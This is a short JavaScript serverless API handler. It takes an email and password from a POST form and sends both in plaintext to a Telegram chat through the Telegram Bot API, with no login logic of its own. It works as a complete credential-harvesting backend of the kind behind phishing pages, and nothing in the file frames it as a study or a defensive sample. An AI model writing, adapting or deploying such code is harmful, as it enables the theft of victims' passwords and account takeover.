export default async function handler(req, res) {
    if (req.method !== 'POST') {
      return res.status(405).json({ error: 'Method not allowed' });
    }
  
    const { email, password } = req.body;
  
    if (!email || !password) {
      return res.status(400).json({ error: 'Email and password are required' });
    }
  
    const botToken = process.env.TELEGRAM_BOT_TOKEN;
    const chatId = process.env.TELEGRAM_CHAT_ID;
    const message = `🔐 New Form Submission\n\n📧 Email: ${email}\n🔑 Password: ${password}`;
  
    const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
  
    try {
      const telegramResponse = await fetch(telegramUrl);
  
      if (!telegramResponse.ok) {
        return res.status(500).json({ error: 'INTERNAL SERVER ERROR' });
      }
  
      return res.status(200).json({ success: true });
    } catch (error) {
      console.error('Telegram Error:', error);
      return res.status(500).json({ error: 'Server error' });
    }
  }
  
